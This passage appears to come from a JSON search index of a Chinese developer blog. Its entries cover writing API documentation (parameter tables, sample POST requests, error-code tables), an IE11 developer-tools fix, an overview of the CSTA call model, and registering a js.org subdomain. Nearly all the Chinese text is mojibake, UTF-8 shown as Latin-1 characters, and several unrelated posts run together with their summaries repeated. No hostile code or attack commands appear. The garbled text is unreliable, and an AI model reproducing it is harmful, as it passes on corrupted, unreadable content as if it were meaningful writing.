‡ã€‚æœ€å°æ•°æ®é›†çš„æ¦‚å¿µèµ·æºäºç¾å›½çš„åŒ»ç–—é¢†åŸŸã€‚æœ€å°æ•°æ®é›†çš„äº§ç”Ÿæºäºä¿¡æ¯äº¤æ¢çš„éœ€è¦ï¼Œå°±å¥½æ¯”ä¸Šä¸‹çº§è´¨é‡æŠ€æœ¯ç›‘ç£éƒ¨é—¨ä¹‹é—´ã€ä¼ä¸šä¸è´¨é‡æŠ€æœ¯ç›‘ç£éƒ¨é—¨ä¹‹é—´ã€è´¨é‡æŠ€æœ¯ç›‘ç£éƒ¨é—¨ä¸ç¤¾ä¼šå…¬ä¼—ä¹‹é—´éƒ½å­˜åœ¨ç€ä¿¡æ¯äº¤æ¢çš„éœ€æ±‚ã€‚\nä¸€äº›æ–‡æ¡£é‡Œå¯èƒ½ä¼šåŠ å…¥å­—æ®µçš„ç±»å‹ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºè¿™æ˜¯æ²¡å¿…è¦çš„ã€‚ä»¥ä¸ºHTTPä¼ è¾“çš„æ•°æ®å¾€å¾€éƒ½éœ€è¦åºåˆ—åŒ–ï¼Œå¤§éƒ¨åˆ†æ•°æ®ç±»å‹éƒ½æ˜¯å­—ç¬¦ä¸²ã€‚ä¸€äº›ç‰¹æ®Šçš„ç±»å‹ï¼Œä¾‹å¦‚æšä¸¾ç±»å‹çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åœ¨è¯´æ˜é‡Œæè¿°ã€‚\nå¦å¤–ï¼šæ•°æ®æ¨¡å‹éå¸¸å»ºè®®ä½¿ç”¨è¡¨æ ¼æ¥è¡¨ç°ã€‚\nä¸¾ä¸ªæ —å­ğŸŒ°ï¼š\nåç§° æ˜¯å¦å¿…é¡» è¯´æ˜ userType æ˜¯ ç”¨æˆ·ç±»å‹ã€‚commomè¡¨ç¤ºæ™®é€šç”¨æˆ·ï¼Œvipè¡¨ç¤ºvipç”¨æˆ· age å¦ ç”¨æˆ·å¹´é¾„ gender å¦ ç”¨æˆ·æ€§åˆ«ã€‚1è¡¨ç¤ºç”·ï¼Œ0è¡¨ç¤ºå¥³ 5. è¯·æ±‚ç¤ºä¾‹ // general POST http://www.testapi.com/api/user // request payload { \u0026#34;name\u0026#34;: \u0026#34;qianxun\u0026#34;, \u0026#34;age\u0026#34;: 14, \u0026#34;like\u0026#34;: [\u0026#34;music\u0026#34;, \u0026#34;reading\u0026#34;], \u0026#34;userType\u0026#34;: \u0026#34;vip\u0026#34; } // response { \u0026#34;id\u0026#34;: \u0026#34;asdkfjalsdkf\u0026#34; } 6. å¼‚å¸¸å¤„ç† å¼‚å¸¸å¤„ç†æœ€å°æ•°æ®é›†\nçŠ¶æ€ç  è¯´æ˜ è§£å†³æ–¹æ¡ˆ ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š\nçŠ¶æ€ç  è¯´æ˜ è§£å†³æ–¹æ¡ˆ 401 ç”¨æˆ·åå¯†ç é”™è¯¯ æ£€æŸ¥ç”¨æˆ·åå¯†ç æ˜¯å¦æ­£ç¡® 424 è¶…è¿‡æœ€å¤§åœ¨çº¿æ•°é‡ è¯·åœ¨æ§åˆ¶å°ä¿®æ”¹æœ€å¤§åœ¨çº¿æ•°é‡ ä¹‹å‰æˆ‘ä¸€ç›´ä¸æƒ³æŠŠè§£å†³æ–¹æ¡ˆåŠ å…¥å¼‚å¸¸å¤„ç†çš„æœ€å°æ•°æ®é›†ï¼Œä½†æ˜¯å¯¹äºå¾ˆå¤šå¼€å‘è€…æ¥è¯´ï¼Œå³ä½¿å®ƒçŸ¥é“424ä»£è¡¨è¶…è¿‡æœ€å¤§åœ¨çº¿æ•°é‡ã€‚å¦‚æœä½ ä¸å‘Šè¯‰å¦‚æœè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆä»–ä»¬å¯èƒ½å°±ä¼šç›´æ¥æ¥é—®ä½ ã€‚æ‰€ä»¥æœ€å¥½èƒ½å¤Ÿä¸€æ­¥åˆ°ä½ï¼Œç›´æ¥å‘Šè¯‰ä»–åº”è¯¥å¦‚ä½•è§£å†³ï¼Œè¿™æ ·çœæ—¶çœåŠ›ã€‚\n7. å¦‚ä½•ç»„ç»‡ï¼Ÿ 7.1. ä¸€ä¸ªåˆ›å»ºç”¨æˆ·çš„ä¾‹å­ï¼šåˆ›å»ºç”¨æˆ· 1 è¯·æ±‚ç¤ºä¾‹\n// general POST http://www.testapi.com/api/user/vip/?token=abcdefg // request payload { \u0026#34;name\u0026#34;: \u0026#34;qianxun\u0026#34;, \u0026#34;age\u0026#34;: 14, \u0026#34;like\u0026#34;: [\u0026#34;music\u0026#34;, \u0026#34;reading\u0026#34;] } // response { \u0026#34;id\u0026#34;: \u0026#34;asdkfjalsdkf\u0026#34; } 2 è·¯å¾„ä¸æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°æ¨¡å‹\nPOST http://www.testapi.com/api/user/{userType}/?token={token}\nåç§° æ˜¯å¦å¿…é¡» è¯´æ˜ userType æ˜¯ ç”¨æˆ·ç±»å‹ã€‚commomè¡¨ç¤ºæ™®é€šç”¨æˆ·ï¼Œvipè¡¨ç¤ºvipç”¨æˆ· token æ˜¯ è®¤è¯ä»¤ç‰Œ 3 è¯·æ±‚ä½“å‚æ•°æ¨¡å‹\nåç§° æ˜¯å¦å¿…é¡» è¯´æ˜ name æ˜¯ ç”¨æˆ·åã€‚4-50ä¸ªå­—ç¬¦ age å¦ å¹´é¾„ like å¦ çˆ±å¥½ã€‚æœ€å¤š20ä¸ª 4 å“åº”ä½“å‚æ•°æ¨¡å‹\nåç§° è¯´æ˜ id ç”¨æˆ·id 5 å¼‚å¸¸å¤„ç†\nçŠ¶æ€ç  è¯´æ˜ è§£å†³æ–¹æ¡ˆ 401 tokenè¿‡æœŸ è¯·é‡æ–°ç”³è¯·token 424 è¶…è¿‡æœ€å¤§åœ¨åˆ›å»ºäººæ•° è¯·åœ¨æ§åˆ¶å°ä¿®æ”¹æœ€å¤§åˆ›å»ºäººæ•° 7.2. è¿™æ ·ç»„ç»‡çš„åŸå›  è¯·æ±‚ç¤ºä¾‹: è¯·æ±‚ç¤ºä¾‹æ”¾åœ¨ç¬¬ä¸€ä½çš„åŸå› æ˜¯ï¼Œè¦ç”¨æœ€å¿«çš„æ–¹å¼å‘Šè¯‰å¼€å‘è€…ï¼Œè¿™ä¸ªæ¥å£åº”è¯¥å¦‚ä½•è¯·æ±‚ è·¯å¾„ä¸æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°æ¨¡å‹ï¼š ä½¿ç”¨mustacheåŒ…è£¹å‚æ•° è¯·æ±‚ä½“å‚æ•°æ¨¡å‹ï¼šå¦‚æœæ²¡æœ‰è¯·æ±‚ä½“ï¼Œå¯ä»¥ä¸å†™ å“åº”ä½“å‚æ•°æ¨¡å‹ï¼š å¼‚å¸¸å¤„ç† 8. æ–‡æ¡£æä¾›çš„å½¢å¼ æ–‡æ¡£å»ºè®®ç”±ä¸€ä¸‹ä¸¤ç§å½¢å¼ï¼Œåœ¨çº¿æ–‡æ¡£ï¼Œpdfæ–‡æ¡£ã€‚\nåœ¨çº¿æ–‡æ¡£ æ›´æ–°æ–¹ä¾¿ æ˜“äºéšæ—¶é˜…è¯» æ˜“äºæŸ¥æ‰¾ pdfæ–‡æ¡£ å†…å®¹è¡¨ç°å§‹ç»ˆå¦‚ä¸€ï¼Œä¸ä¾èµ–æ–‡æ¡£é˜…è¯»å™¨ æ–‡æ¡£åªè¯»ï¼Œä¸ä¼šè¢«è½»æ˜“ä¿®æ”¹ å…¶ä¸­ç”±äºæ˜¯é¢å¯¹ç¬¬ä¸‰æ–¹å¼€å‘è€…ï¼Œå…¬å¼€çš„åœ¨çº¿æ–‡æ¡£å¿…é¡»æä¾›ï¼›ç”±äºæŸäº›ç‰¹æ®Šçš„åŸå› ï¼Œå¯èƒ½éœ€è¦æä¾›æ–‡ä»¶å½¢å¼çš„æ–‡æ¡£ï¼Œå»ºè®®æä¾›pdfæ–‡æ¡£ã€‚å½“ç„¶ï¼Œä»¥ä¸‹çš„æ–‡æ¡£å½¢å¼æ˜¯éå¸¸ä¸å»ºè®®æä¾›çš„ï¼š\nwordæ–‡æ¡£ markdownæ–‡æ¡£ wordæ–‡æ¡£å’Œmarkdownæ–‡æ¡£æœ‰ä»¥ä¸‹ç¼ºç‚¹ï¼š\næ–‡æ¡£çš„è¡¨ç°å½¢å¼éå¸¸ä¾èµ–æ–‡æ¡£æŸ¥çœ‹å™¨ï¼šå„ä¸ªç‰ˆæœ¬çš„wordæ–‡æ¡£å¯¹wordçš„è¡¨ç°å½¢å¼å·®å¼‚å¾ˆå¤§ï¼Œå¯èƒ½åœ¨ä½ çš„ç”µè„‘ä¸Šå†…å®¹è¡¨ç°å¾ˆå¥½çš„æ–‡æ¡£ï¼Œåˆ°åˆ«äººçš„ç”µè„‘ä¸Šå°±ä¼šä¸€å›¢ä¹±éº»ï¼›å¦å¤–markdownæ–‡ä»¶ä¹Ÿæ˜¯å¦‚æ­¤ã€‚è€Œä¸”markdownä¸­å¼•å…¥æ–‡ä»¶åªèƒ½ä¾é å›¾ç‰‡é“¾æ¥ï¼Œå¦‚æœæ–‡æ¡£ä¸­å«æœ‰å›¾ç‰‡ï¼Œå¾ˆå¯èƒ½ä¼šå‡ºç°å›¾ç‰‡ä¸¢å¤±çš„æƒ…å†µã€‚ æ–‡æ¡£æ— æ³•åªè¯»ï¼šæ–‡æ¡£æ— æ³•åªè¯»ï¼Œå°±æœ‰å¯èƒ½ä¼šè¢«ç¬¬ä¸‰æ–¹å¼€å‘è€…åœ¨ä¸ç»æ„é—´ä¿®æ”¹ï¼Œé‚£ä¹ˆæ–‡æ¡£å°±æ— æ³•ä¿è¯å…¶å‡†ç¡®æ€§äº†ã€‚ æ€»ç»“ä¸€ä¸‹ï¼Œæ–‡æ¡£å½¢å¼çš„è¦ç‚¹ï¼š\nåªè¯»æ€§ï¼šä¿è¯æ–‡æ¡£ä¸ä¼šè¢«å¼€å‘è€…è½»æ˜“ä¿®æ”¹ ä¸€è‡´æ€§ï¼šä¿è¯æ–‡æ¡£åœ¨ä¸åŒè®¾å¤‡ï¼Œä¸åŒæ–‡æ¡£æŸ¥çœ‹å™¨ä¸Šå†…å®¹è¡¨ç°å§‹ç»ˆå¦‚ä¸€ æ˜“äºç‰ˆæœ¬ç®¡ç†ï¼šæ–‡æ¡£å³è½¯ä»¶ï¼ˆDAAS: Document as a Softwareï¼‰ï¼Œä¸€èˆ¬æ„ä¹‰ä¸Šè¯´è½¯ä»¶ = æ•°æ® + ç®—æ³•, ä½†æ˜¯æˆ‘è®¤ä¸ºæ–‡æ¡£ä¹Ÿæ˜¯ä¸€ç§ç»„æˆè½¯ä»¶çš„é‡è¦å½¢å¼ã€‚æ—¢ç„¶è½¯ä»¶éœ€è¦ç‰ˆæœ¬ç®¡ç†ï¼Œæ–‡æ¡£çš„ç‰ˆæœ¬ç®¡ç†ä¹Ÿæ˜¯æ¯”ä¸å¯å°‘çš„ã€‚ ","permalink":"https://wdd.js.org/posts/2018/01/how-to-write-better-api-docs/","summary":"1. HTTPæºå¸¦ä¿¡æ¯çš„æ–¹å¼ url headers body: åŒ…æ‹¬è¯·æ±‚ä½“ï¼Œå“åº”ä½“ 2. åˆ†ç¦»é€šç”¨ä¿¡æ¯ ä¸€èˆ¬æ¥è¯´ï¼Œheadersé‡Œçš„ä¿¡æ¯éƒ½æ˜¯é€šç”¨çš„ï¼Œå¯ä»¥æå‰è¯´æ˜ï¼Œä½œä¸ºé»˜è®¤å‚æ•°\n3. è·¯å¾„ä¸­çš„å‚æ•°è¡¨è¾¾å¼ URLä¸­å‚æ•°è¡¨è¾¾å¼ä½¿ç”¨{}çš„å½¢å¼ï¼Œå‚æ•°åŒ…è£¹åœ¨å¤§æ‹¬å·ä¹‹ä¸­{paramName}\nä¾‹å¦‚ï¼š\n/api/user/{userId} /api/user/{userType}?age={age}\u0026amp;gender={gender} 4. æ•°æ®æ¨¡å‹å®šä¹‰ æ•°æ®æ¨¡å‹å®šä¹‰åŒ…æ‹¬ï¼š\nè·¯å¾„ä¸æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°æ¨¡å‹ è¯·æ±‚ä½“å‚æ•°æ¨¡å‹ å“åº”ä½“å‚æ•°æ¨¡å‹ æ•°æ®æ¨¡å‹çš„æœ€å°æ•°æ®é›†ï¼š\nåç§° æ˜¯å¦å¿…é¡» è¯´æ˜ â€œæœ€å°æ•°æ®é›†â€ï¼ˆMDSï¼‰æ˜¯æŒ‡é€šè¿‡æ”¶é›†æœ€å°‘çš„æ•°æ®ï¼Œè¾ƒå¥½åœ°æŒæ¡ä¸€ä¸ªç ”ç©¶å¯¹è±¡æ‰€å…·æœ‰çš„ç‰¹ç‚¹æˆ–ä¸€ä»¶äº‹æƒ…ã€ä¸€ä»½å·¥ä½œæ‰€å¤„çš„çŠ¶æ€ï¼Œå…¶æ ¸å¿ƒæ˜¯é’ˆå¯¹è¢«è§‚å¯Ÿçš„å¯¹è±¡å»ºç«‹èµ·ä¸€å¥—ç²¾ç®€å®ç”¨çš„æ•°æ®æŒ‡æ ‡ã€‚æœ€å°æ•°æ®é›†çš„æ¦‚å¿µèµ·æºäºç¾å›½çš„åŒ»ç–—é¢†åŸŸã€‚æœ€å°æ•°æ®é›†çš„äº§ç”Ÿæºäºä¿¡æ¯äº¤æ¢çš„éœ€è¦ï¼Œå°±å¥½æ¯”ä¸Šä¸‹çº§è´¨é‡æŠ€æœ¯ç›‘ç£éƒ¨é—¨ä¹‹é—´ã€ä¼ä¸šä¸è´¨é‡æŠ€æœ¯ç›‘ç£éƒ¨é—¨ä¹‹é—´ã€è´¨é‡æŠ€æœ¯ç›‘ç£éƒ¨é—¨ä¸ç¤¾ä¼šå…¬ä¼—ä¹‹é—´éƒ½å­˜åœ¨ç€ä¿¡æ¯äº¤æ¢çš„éœ€æ±‚ã€‚\nä¸€äº›æ–‡æ¡£é‡Œå¯èƒ½ä¼šåŠ å…¥å­—æ®µçš„ç±»å‹ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºè¿™æ˜¯æ²¡å¿…è¦çš„ã€‚ä»¥ä¸ºHTTPä¼ è¾“çš„æ•°æ®å¾€å¾€éƒ½éœ€è¦åºåˆ—åŒ–ï¼Œå¤§éƒ¨åˆ†æ•°æ®ç±»å‹éƒ½æ˜¯å­—ç¬¦ä¸²ã€‚ä¸€äº›ç‰¹æ®Šçš„ç±»å‹ï¼Œä¾‹å¦‚æšä¸¾ç±»å‹çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥åœ¨è¯´æ˜é‡Œæè¿°ã€‚\nå¦å¤–ï¼šæ•°æ®æ¨¡å‹éå¸¸å»ºè®®ä½¿ç”¨è¡¨æ ¼æ¥è¡¨ç°ã€‚\nä¸¾ä¸ªæ —å­ğŸŒ°ï¼š\nåç§° æ˜¯å¦å¿…é¡» è¯´æ˜ userType æ˜¯ ç”¨æˆ·ç±»å‹ã€‚commomè¡¨ç¤ºæ™®é€šç”¨æˆ·ï¼Œvipè¡¨ç¤ºvipç”¨æˆ· age å¦ ç”¨æˆ·å¹´é¾„ gender å¦ ç”¨æˆ·æ€§åˆ«ã€‚1è¡¨ç¤ºç”·ï¼Œ0è¡¨ç¤ºå¥³ 5. è¯·æ±‚ç¤ºä¾‹ // general POST http://www.testapi.com/api/user // request payload { \u0026#34;name\u0026#34;: \u0026#34;qianxun\u0026#34;, \u0026#34;age\u0026#34;: 14, \u0026#34;like\u0026#34;: [\u0026#34;music\u0026#34;, \u0026#34;reading\u0026#34;], \u0026#34;userType\u0026#34;: \u0026#34;vip\u0026#34; } // response { \u0026#34;id\u0026#34;: \u0026#34;asdkfjalsdkf\u0026#34; } 6. å¼‚å¸¸å¤„ç† å¼‚å¸¸å¤„ç†æœ€å°æ•°æ®é›†","title":"å¦‚ä½•å†™å¥½æ¥å£æ–‡æ¡£ï¼Ÿ"},{"content":"è§£å†³æ–¹æ³•å®‰è£…Windows7è¡¥ä¸ï¼šKB3008923ï¼› ä¸‹è½½åœ°å€ï¼š http://www.microsoft.com/en-us/download/details.aspx?id=45134 ï¼ˆ32ä½ï¼‰ http://www.microsoft.com/zh-CN/download/details.aspx?id=45154 ï¼ˆ64ä½ï¼‰\n","permalink":"https://wdd.js.org/posts/2018/01/ie11-without-devtool/","summary":"è§£å†³æ–¹æ³•å®‰è£…Windows7è¡¥ä¸ï¼šKB3008923ï¼› ä¸‹è½½åœ°å€ï¼š http://www.microsoft.com/en-us/download/details.aspx?id=45134 ï¼ˆ32ä½ï¼‰ http://www.microsoft.com/zh-CN/download/details.aspx?id=45154 ï¼ˆ64ä½ï¼‰","title":"win7 ie11 å¼€å‘è€…å·¥å…·æ‰“å¼€åä¸€ç‰‡ç©ºç™½"},{"content":"1. å†…å®¹æ¦‚è¦ CSTAåè®®ä¸æ ‡å‡†æ¦‚è¿° CSTA OpenScape è¯­éŸ³æ¶æ„æ¦‚è¿° 2. CSTAåè®®æ ‡å‡† 2.1. ä»€ä¹ˆæ˜¯CSTA ? CSTAï¼šç”µè„‘æ”¯æŒé€šè®¯ç¨‹åº(Computer Supported TelecommunicationsApplications)\nåŸºæœ¬çš„å‘¼å«æ¨¡å‹åœ¨1992å»ºç«‹ï¼Œåæ¥éšç€è¡Œä¸šå‘å±•ï¼Œå‘¼å«æ¨¡å‹ä¹Ÿè¢«åŠ å¼ºå’Œæ‰©å±•ï¼Œä¾‹å¦‚æ–°çš„åè®®ç­‰ç­‰\nCSTAæ˜¯ä¸€ä¸ªåº”ç”¨å±‚æ¥å£ï¼Œç”¨æ¥ç›‘æ§å‘¼å«ï¼Œè®¾å¤‡å’Œç½‘ç»œ\nCSTAåˆ›å»ºäº†ä¸€ä¸ªé€šè®¯ç¨‹åºçš„æŠ½è±¡å±‚:\nCSTAå¹¶ä¸ä¾èµ–ä»»ä½•åº•å±‚çš„ä¿¡ä»¤åè®® E.g.H.323,SIP,Analog,T1,ISDN,etc. CSTAå¹¶ä¸è¦æ±‚ç”¨æˆ·å¿…é¡»ä½¿ç”¨æŸäº›è®¾å¤‡ E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer é€‚ç”¨ä¸åŒçš„æ“ä½œæ¨¡å¼\nç¬¬ä¸‰æ–¹å‘¼å«æ§åˆ¶ ä¸€æ–¹å‘¼å«æ§åˆ¶ CSTAçš„è®¾è®¡ç›®æ ‡æ˜¯ä¸ºäº†æé«˜å„ç§CSTAå®ç°ä¹‹é—´çš„ç§»æ¤æ€§\nè§„èŒƒåŒ–å‘¼å«æ¨¡å‹å’Œè¡Œä¸º å®ŒæˆæœåŠ¡ã€äº‹ä»¶å®šä¹‰ è§„èŒƒåŒ–æ ‡å‡† 3. CSTA æ ‡å‡†çš„è¿›åŒ–å² é˜¶æ®µ1 (å‘å¸ƒäº June â€™92)\n40 ç‰¹æ€§, 66 é¡µ (æœåŠ¡å®šä¹‰) ä¸“æ³¨äºå‘¼å«æ§åˆ¶ é˜¶æ®µ2 (å‘å¸ƒäº Dec. â€™94)\n77 ç‰¹æ€§, 145 é¡µ (æœåŠ¡å®šä¹‰) I/O \u0026amp; è¯­éŸ³å•å…ƒæœåŠ¡, æ›´å¤šå‘¼å«æ§åˆ¶æœåŠ¡ é˜¶æ®µ3 - CSTA Phase II Features \u0026amp; versit CTI Technology\nå‘å¸ƒäº Dec. â€˜98 136 ç‰¹æ€§, 650 é¡µ (æœåŠ¡å®šä¹‰) ä½œä¸ºISO æ ‡å‡†å‘å¸ƒäº July 2000 å‘å¸ƒ CSTA XML (ECMA-323) June 2004 å‘å¸ƒ â€œUsing CSTA with Voice Browsersâ€ (TR/85) Dec. 02 å‘å¸ƒ CSTA WSDL (ECMA-348) June 2004 June 2004: å‘å¸ƒå¯¹è±¡æ¨¡å‹ TR/88\nJune 2004: å‘å¸ƒ â€œUsing CSTA for SIP Phone User Agents (uaCSTA)â€ TR/87\nJune 2004: å‘å¸ƒ â€œApplication Session Servicesâ€ (ECMA-354)\nJune 2005: å‘å¸ƒ â€œWS-Session: WSDL for ECMA-354â€(ECMA-366)\nDecember 2005 : å‘å¸ƒ â€œManagement Notification and Computing Function Servicesâ€\nDecember 2005 : Session Management, Event Notification, Amendements for ECMA- 348â€ (TR/90)\nDecember 2006 : Published new editions of ECMA-269, ECMA-323, ECMA-348\n4. CSTA æ ‡å‡†æ–‡æ¡£ 5. CSTA æ ‡å‡†æ‰©å±• æ–°çš„ç‰¹æ€§å¯ä»¥è¢«åŠ å…¥æ ‡å‡†é€šè¿‡å‘å¸ƒæ–°ç‰ˆæœ¬çš„æ ‡å‡† æ–°çš„å‚æ•°ï¼Œæ–°çš„å€¼å¯ä»¥è¢«åŠ å…¥é€šè¿‡å‘å¸ƒæ–°ç‰ˆæœ¬çš„æ ‡å‡† æœªæ¥çš„æ–°ç‰ˆæœ¬å¿…é¡»ä¸‹å‘åå…¼å®¹ å…·ä½“çš„å®æ–½å¯ä»¥å¢åŠ å±æ€§é€šè¿‡CSTAè‡ªå¸¦çš„æ‰©å±•æœºåˆ¶(e.g. ONS â€“ One Number Service) 6. CSTA æ“ä½œæ¨¡å‹ CSTAæ“ä½œæ¨¡å‹ç”±è®¡ç®—åŸŸå’Œè½¬æ¢åŸŸç»„æˆï¼Œæ˜¯CSTAå®šä¹‰åœ¨ä¸¤ä¸ªåŸŸä¹‹é—´çš„æ¥å£ CSTAæ ‡å‡†è§„å®šäº†æ¶ˆæ¯ï¼ˆæœåŠ¡ä»¥åŠäº‹ä»¶ä¸ŠæŠ¥ï¼‰,è¿˜æœ‰ä¸ä¹‹ç›¸å…³çš„è¡Œä¸º è®¡ç®—åŸŸæ˜¯CSTAç¨‹åºçš„å®¿ä¸»ç¯å¢ƒï¼Œç”¨æ¥ä¸è½¬æ¢åŸŸäº¤äº’ä¸æ§åˆ¶ è½¬æ¢åŸŸ - CSTAæ¨¡å‹æä¾›æŠ½è±¡å±‚ï¼Œç¨‹åºå¯ä»¥è§‚æµ‹å¹¶æ§åˆ¶çš„ã€‚è½¬æ¢æ¸”åŒ…æ‹¬ä¸€äº›å¯¹è±¡ä¾‹å¦‚CSTAå‘¼å«ï¼Œè®¾å¤‡ï¼Œé“¾æ¥ã€‚ 7. CSTA æ“ä½œæ¨¡å‹ï¼šå‘¼å«ï¼Œè®¾å¤‡ï¼Œé“¾æ¥ ç›¸å…³è¯´æ˜æ˜¯çš„çš„çš„çš„\n8. å‚è€ƒ CSTAoverview CSTA_introduction_and_overview ","permalink":"https://wdd.js.org/posts/2018/01/csta-call-model-overview/","summary":"1. å†…å®¹æ¦‚è¦ CSTAåè®®ä¸æ ‡å‡†æ¦‚è¿° CSTA OpenScape è¯­éŸ³æ¶æ„æ¦‚è¿° 2. CSTAåè®®æ ‡å‡† 2.1. ä»€ä¹ˆæ˜¯CSTA ? CSTAï¼šç”µè„‘æ”¯æŒé€šè®¯ç¨‹åº(Computer Supported TelecommunicationsApplications)\nåŸºæœ¬çš„å‘¼å«æ¨¡å‹åœ¨1992å»ºç«‹ï¼Œåæ¥éšç€è¡Œä¸šå‘å±•ï¼Œå‘¼å«æ¨¡å‹ä¹Ÿè¢«åŠ å¼ºå’Œæ‰©å±•ï¼Œä¾‹å¦‚æ–°çš„åè®®ç­‰ç­‰\nCSTAæ˜¯ä¸€ä¸ªåº”ç”¨å±‚æ¥å£ï¼Œç”¨æ¥ç›‘æ§å‘¼å«ï¼Œè®¾å¤‡å’Œç½‘ç»œ\nCSTAåˆ›å»ºäº†ä¸€ä¸ªé€šè®¯ç¨‹åºçš„æŠ½è±¡å±‚:\nCSTAå¹¶ä¸ä¾èµ–ä»»ä½•åº•å±‚çš„ä¿¡ä»¤åè®® E.g.H.323,SIP,Analog,T1,ISDN,etc. CSTAå¹¶ä¸è¦æ±‚ç”¨æˆ·å¿…é¡»ä½¿ç”¨æŸäº›è®¾å¤‡ E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer é€‚ç”¨ä¸åŒçš„æ“ä½œæ¨¡å¼\nç¬¬ä¸‰æ–¹å‘¼å«æ§åˆ¶ ä¸€æ–¹å‘¼å«æ§åˆ¶ CSTAçš„è®¾è®¡ç›®æ ‡æ˜¯ä¸ºäº†æé«˜å„ç§CSTAå®ç°ä¹‹é—´çš„ç§»æ¤æ€§\nè§„èŒƒåŒ–å‘¼å«æ¨¡å‹å’Œè¡Œä¸º å®ŒæˆæœåŠ¡ã€äº‹ä»¶å®šä¹‰ è§„èŒƒåŒ–æ ‡å‡† 3. CSTA æ ‡å‡†çš„è¿›åŒ–å² é˜¶æ®µ1 (å‘å¸ƒäº June â€™92)\n40 ç‰¹æ€§, 66 é¡µ (æœåŠ¡å®šä¹‰) ä¸“æ³¨äºå‘¼å«æ§åˆ¶ é˜¶æ®µ2 (å‘å¸ƒäº Dec. â€™94)\n77 ç‰¹æ€§, 145 é¡µ (æœåŠ¡å®šä¹‰) I/O \u0026amp; è¯­éŸ³å•å…ƒæœåŠ¡, æ›´å¤šå‘¼å«æ§åˆ¶æœåŠ¡ é˜¶æ®µ3 - CSTA Phase II Features \u0026amp; versit CTI Technology\nå‘å¸ƒäº Dec. â€˜98 136 ç‰¹æ€§, 650 é¡µ (æœåŠ¡å®šä¹‰) ä½œä¸ºISO æ ‡å‡†å‘å¸ƒäº July 2000 å‘å¸ƒ CSTA XML (ECMA-323) June 2004 å‘å¸ƒ â€œUsing CSTA with Voice Browsersâ€ (TR/85) Dec.","title":"CSTA å‘¼å«æ¨¡å‹ç®€ä»‹"},{"content":" ä¹‹å‰æˆ‘æ˜¯ä½¿ç”¨wangduanduan.github.ioä½œä¸ºæˆ‘çš„åšå®¢åœ°å€ï¼Œåæ¥è§‰å¾—éº»çƒ¦ï¼Œæœ‰æŠŠåšå®¢å…³äº†ã€‚æœ€è¿‘æœ‰æƒ³å»æŠ˜è…¾æŠ˜è…¾ã€‚ å…ˆçœ‹æ•ˆæœï¼šwdd.js.org\nå¦‚æœä½ ä¸äº†è§£js.orgå¯ä»¥çœ‹çœ‹æˆ‘çš„è¿™ç¯‡æ–‡ç« :ä¸€ä¸ªå€¼å¾—æ‰€æœ‰å‰ç«¯å¼€å‘è€…å…³æ³¨çš„ç½‘ç«™js.org\n1. å‰æ å·²ç»æœ‰äº†github pagesçš„ä¸€ä¸ªåšå®¢ï¼Œå¹¶ä¸”åšå®¢ä¸­æœ‰å†…å®¹ï¼Œæ²¡æœ‰å†…å®¹ä¼šå®¡æ ¸ä¸é€šè¿‡çš„ã€‚æˆ‘ç¬¬ä¸€æ¬¡ç”³è¯·åŸŸåï¼Œå°±æ˜¯å› ä¸ºå†…å®¹å¤ªå°‘è€Œå®¡æ ¸ä¸é€šè¿‡ã€‚ 2. æƒ³å¥½è‡ªå·±è¦ä»€ä¹ˆåŸŸåï¼Ÿ æ¯”å¦‚ä½ æƒ³è¦ä¸€ä¸ªï¼šwdd.js.orgçš„åŸŸåï¼Œä½ å…ˆåœ¨æµè§ˆå™¨é‡Œè®¿é—®è¿™ä¸ªåœ°å€ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰äººç”¨è¿‡ï¼Œå¦‚æœå·²ç»æœ‰äººç”¨è¿‡ï¼Œé‚£ä¹ˆä½ å°±åªèƒ½æƒ³ç‚¹å…¶ä»–çš„åŸŸåäº†ã€‚\n3. fork js.orgçš„é¡¹ç›®ï¼Œæ·»åŠ è‡ªå·±çš„åŸŸå 1 fork https://github.com/js-org/dns.js.org 2 ä¿®æ”¹ä½ forkåçš„ä»“åº“ä¸­çš„cnames_active.jsæ–‡ä»¶ï¼ŒåŠ ä¸Šè‡ªå·±çš„ä¸€æ¡åŸŸåï¼Œæœ€å¥½è¦æŒ‰ç…§å­—æ¯é¡ºåº\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘åœ¨ç¬¬1100è¡ŒåŠ å…¥ã€‚æ³¨æ„ï¼Œä¸è¦åœ¨è¯¥è¡ŒååŠ ä»»ä½•æ³¨é‡Šã€‚\n\u0026#34;wdd\u0026#34;: \u0026#34;wangduanduan.github.io\u0026#34;, 3 commit\n4. åŠ å…¥CNAMEæ–‡ä»¶ æˆ‘æ˜¯ç”¨hexoå’Œnextä¸»é¢˜ä½œä¸ºåšå®¢çš„æ¨¡æ¿ã€‚å…¶ä¸­æˆ‘åœ¨gh-pagesåˆ†æ”¯å†™åšå®¢ï¼Œç„¶åéƒ¨ç½²åˆ°masteråˆ†æ”¯ã€‚\næˆ‘åœ¨æˆ‘çš„gh-pagesåˆ†æ”¯çš„sourceç›®å½•ä¸‹åŠ å…¥CNAMEæ–‡ä»¶, å†…å®¹åªæœ‰ä¸€è¡Œ\nwdd.js.org å°†åšå®¢å†æ¬¡éƒ¨ç½²å¥½ï¼Œå¦‚æœCNAMEç”Ÿæ•ˆçš„è¯ï¼Œä½ å·²ç»æ— æ³•ä»åŸæ¥çš„åœ°å€è®¿é—®ï¼šwangduanduan.github.ioï¼Œ è¿™ä¸ªåšå®¢äº†ã€‚\n5. å‘js.orgé¡¹ç›®å‘èµ·pull-request æ‰¾åˆ°ä½ forkåçš„é¡¹ç›®ï¼Œç‚¹å‡» new pull request, å‘åŸæ¥çš„é¡¹ç›®å‘èµ·è¯·æ±‚ã€‚\nç„¶åä½ å¯ä»¥åœ¨js-org/dns.js.orgé¡¹ç›®çš„pull requestsçœ‹åˆ°ä½ 